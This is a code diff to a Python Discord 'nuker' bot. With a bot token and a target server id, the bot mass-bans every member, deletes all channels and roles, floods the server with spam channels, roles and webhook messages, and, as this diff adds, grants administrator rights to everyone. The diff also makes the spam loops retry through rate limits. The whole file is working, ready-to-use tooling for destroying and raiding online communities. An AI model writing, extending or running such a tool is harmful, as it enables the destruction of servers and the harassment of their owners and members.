@@ -1,14 +1,19 @@
-import json
-import string
-import requests
-import os
-import threading
-import time
-import discord
-from discord.ext import commands
-from colorama import Fore
-from datetime import timedelta
-import random
+try:
+  import os
+  import json
+  import string
+  import requests
+  import threading
+  import time
+  import discord
+  from discord.ext import commands
+  from colorama import Fore,Style,Back
+  from datetime import timedelta
+  import random
+  import sys
+except:
+  print("couldn't import all required packages, try again later.")
+  exit()
 
 print(f'''
 {Fore.RED}
@@ -30,14 +35,14 @@ print(f'''
 ██║╚████║██║░░░██║██╔═██╗░██╔══╝░░██╔══██╗
 ██║░╚███║╚██████╔╝██║░╚██╗███████╗██║░░██║
 ╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
-
 {Fore.RESET}
 ''')
 
 with open('setup.json') as f:
   setup = json.load(f)
 
-token = setup.get("token")
+token = setup.get("bot").get("token")
+bot_status = setup.get("bot").get("bot_status")
 scname = setup.get("channel_spam_name")
 rcname = setup.get("role_spam_name")
 spam_msg = setup.get("spam_message")
@@ -53,38 +58,50 @@ if rcamount > 250:
   exit()
 
 try:
-  members = open('members.txt')
+  members = open('members.hepi')
 except:
-  with open('members.txt', 'w') as f:
+  with open('members.hepi', 'w') as f:
     f.write("")
-  members = open('members.txt')
+  members = open('members.hepi')
 
 try:
-  channels = open('channels.txt')
+  channels = open('channels.hepi')
 except:
-  with open('channels.txt', 'w') as f:
+  with open('channels.hepi', 'w') as f:
     f.write("")
-  channels = open('channels.txt')
+  channels = open('channels.hepi')
 
 try:
-  roles = open('roles.txt')
+  roles = open('roles.hepi')
 except:
-  with open('roles.txt', 'w') as f:
+  with open('roles.hepi', 'w') as f:
     f.write("")
-  roles = open('roles.txt')
+  roles = open('roles.hepi')
 
-x = open('members.txt', 'w')
+x = open('members.hepi', 'w')
 x.close()
-y = open('channels.txt', 'w')
+y = open('channels.hepi', 'w')
 y.close()
-z = open('roles.txt', 'w')
+z = open('roles.hepi', 'w')
 z.close()
 
 bot = commands.Bot(command_prefix='?', intents=discord.Intents.all())
-
 headers = {'authorization':"Bot "+token}
+me = json.loads(requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers).text)
 
+class hepi:
+  __version__ = "3.2.0++"
+  __author__ = "DaredeviL"
+
+print(f"Token: {Fore.YELLOW}{token}{Fore.RESET}\nBot: {Fore.CYAN}{me['username']}#{me['discriminator']}{Fore.RESET}\nBot invite URL:\n{Fore.BLUE}https://discord.com/oauth2/authorize?client_id={me['id']}&scope=bot&permissions=8{Fore.RESET}\n\nVersion {Fore.MAGENTA}{hepi.__version__}{Fore.RESET}, made by {Fore.YELLOW}{hepi.__author__}{Fore.RESET}.\n")
 guild = input("server id to nuke\n>")
+
+spinList = ["|","/","-","\\"]
+for x in spinList+spinList+spinList:
+  sys.stdout.write("\rstarting nuker "+x)
+  sys.stdout.flush()
+  time.sleep(0.1)
+
 if guild.isnumeric() is False:
   print(f"{Fore.RED}The id must be a number.")
   exit()
@@ -100,6 +117,10 @@ def main():
   except Exception as e:
     if "improper token has" in str(e).lower():
       print(f"{Fore.RED}an improper bot token has been passed.")
+    elif "our rate limits freq" in str(e).lower():
+      print(f"{Fore.RED}You are being rate limited, please try again later.")
+    elif "intents" in str(e).lower():
+      print(f"{Fore.RED} Enable all intents.")
 
 def createhook(channel):
   try:
@@ -141,11 +162,14 @@ def droles(rid):
       break
 
 def sroles(name):
-  json = {'name': name, 'type': 0}
-  r = requests.post(f"https://discord.com/api/v9/guilds/{guild}/roles", headers=headers, json=json)
-  print(f"{Fore.GREEN}role created.{Fore.RESET}")
-  if 'retry_after' in r.text:
-    print(f"Ratelimited, you can try again in:{timedelta(int(r.json()['retry_after']))}.")
+  while True:
+    json = {'name': name, 'type': 0}
+    r = requests.post(f"https://discord.com/api/v9/guilds/{guild}/roles", headers=headers, json=json)
+    print(f"{Fore.GREEN}role created.{Fore.RESET}")
+    if 'retry_after' in r.text:
+      print(f"Ratelimited, you can try again in:{timedelta(int(r.json()['retry_after']))}.")
+    else:
+      break
 
 def massb(user):
   while True:
@@ -166,18 +190,21 @@ def spammer(channel):
       pass
 
 def schannels(name):
-  json = {'name': name,'type': 0}
-  r = requests.post(f"https://discord.com/api/v9/guilds/{guild}/channels", headers=headers, json=json)
-  print(f"{Fore.GREEN}channel created{Fore.RESET}")
-  if hookspam:
-    webhook = createhook(r.json()['id'])
-    f = threading.Thread(target=sendhook, args=(webhook,))
-    f.start()
-  else:
-    f = threading.Thread(target=spammer, args=(r.json()['id'],))
-    f.start()
-  if 'retry_after' in r.text:
-    print(f"Ratelimited, you can try again in:{timedelta(int(r.json()['retry_after']))}.")
+  while True:
+    json = {'name': name,'type': 0}
+    r = requests.post(f"https://discord.com/api/v9/guilds/{guild}/channels", headers=headers, json=json)
+    print(f"{Fore.GREEN}channel created{Fore.RESET}")
+    if hookspam:
+      webhook = createhook(r.json()['id'])
+      f = threading.Thread(target=sendhook, args=(webhook,))
+      f.start()
+    else:
+      f = threading.Thread(target=spammer, args=(r.json()['id'],))
+      f.start()
+    if 'retry_after' in r.text:
+      print(f"Ratelimited, you can try again in:{timedelta(int(r.json()['retry_after']))}.")
+    else:
+      break
 
 ballvar = []
 channvar = []
@@ -197,7 +224,7 @@ def wizz():
   print(f"Banall complete, time took: {endball - startball}")
   print("channel del will start shortly...")
   startchdel = time.time()
-  for i in range(0, 50):
+  for i in range(50):
     for c in channels:
       y = threading.Thread(target=dchannels, args=(c,))
       y.start()
@@ -215,23 +242,23 @@ def clear():
 
 @bot.event
 async def on_ready():
+  await bot.change_presence(activity=discord.Game(name=bot_status))
   clear()
-  print(f"Bot is not in any servers? the invite url is below!\n{Fore.BLUE}https://discord.com/oauth2/authorize?client_id={bot.user.id}&scope=bot&permissions=8")
   id = bot.get_guild(serverid)
   if id is None:
     print(f"{Fore.RED}Server not found.")
     exit()
-  cdata = open('channels.txt','a')
+  cdata = open('channels.hepi','a')
   print("Getting channels...")
   with cdata as x:
     for channel in id.channels:
       x.write(f"{channel.id}\n")
   print("Getting roles...")
-  rdata = open('roles.txt', 'a')
+  rdata = open('roles.hepi', 'a')
   with rdata as g:
     for role in id.roles:
       g.write(f"{role.id}\n")
-  mdata = open('members.txt', 'a')
+  mdata = open('members.hepi', 'a')
   print("getting members...")
   with mdata as f:
     for member in id.members:
@@ -241,7 +268,6 @@ async def on_ready():
   time.sleep(2)
   clear()
   print(Fore.RED + f'''
-{Fore.BLUE}Zachists will rise ',:)
 
 {Fore.RED}
 ██╗░░██╗███████╗██████╗░██╗
@@ -264,47 +290,70 @@ async def on_ready():
 ╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
 
 {Fore.RESET}
---------Server info---------
+{Back.BLUE}-----{Fore.WHITE}Server info{Fore.RESET}-----{Back.RESET}
 
 Name: {Fore.BLUE}{id.name}{Fore.RESET}
 MemberCount: {Fore.GREEN}{len(id.members)}{Fore.RESET}
 Channels: {Fore.CYAN}{len(id.channels)}{Fore.RESET}
+Roles: {Fore.RED}{len(id.roles)}{Fore.RESET}
 Owner: {Fore.YELLOW}{id.owner}{Fore.RESET}
 
---------options---------
+{Back.WHITE}-----{Fore.BLACK}Nuke Options{Fore.RESET}-----{Back.RESET}
 
-(1) Wizz
-(2) Delete all channels
-(3) Spam channels
-(4) banall
-(5) delete all roles
-(6) spam roles
+(1) {Fore.RED}Wizz{Fore.RESET}
+(2) {Fore.YELLOW}Delete all channels{Fore.RESET}
+(3) {Fore.GREEN}\033[96mSpam channels{Fore.RESET}
+(4) {Fore.MAGENTA}banall{Fore.RESET}
+(5) {Fore.CYAN}delete all roles{Fore.RESET}
+(6) {Fore.GREEN}{Style.DIM}spam roles{Style.RESET_ALL}{Fore.RESET}
+(7) {Style.DIM}admin for everyone{Style.RESET_ALL}
+(8) \033[93mflood a channel with webhooks
 ''' + Fore.RESET)
   while True:
     option = input(">")
     if option == "1":
       wizz()
     elif option == "2":
+      be4 = time.time()
       for c in channels:
         y = threading.Thread(target=dchannels, args=(c,))
         y.start()
+      print(f"ChannelDel complete, time took: {time.time()-be4}")
     elif option == "3":
+      be4 = time.time()
       for fr in range(scamount):
         tr = threading.Thread(target=schannels, args=(scname,))
         tr.start()
+      print(f"channelSpam complete, time took: {time.time()-be4}")
     elif option == "4":
+      be4 = time.time()
       for m in members:
         x = threading.Thread(target=massb, args=(m,))
         x.start()
+      print(f"banall complete, time took: {time.time()-be4}")
     elif option == "5":
+      be4 = time.time()
       for r in roles:
         z = threading.Thread(target=droles, args=(r,))
         z.start()
+      print(f"roleDel complete, time took: {time.time()-be4}")
     elif option == "6":
       for hh in range(rcamount):
         res = threading.Thread(target=sroles, args=(rcname,))
         res.start()
-
+    elif option == "7":
+      perm = discord.Permissions()
+      perm.update(administrator = True)
+      await id.default_role.edit(permissions=perm)
+      print(f"{Fore.GREEN}{len(id.members)} members has been given the admin permission!{Fore.RESET}")
+    elif option == "8":
+      intput = int(input("Channel id to flood\n>"))
+      if bot.get_channel(intput) == None:
+        print(f"{Fore.RED}channel not found.")
+      else:
+        webhook = createhook(intput)
+        f = threading.Thread(target=sendhook, args=(webhook,))
+        f.start()
 
 if __name__ == '__main__':
   main()
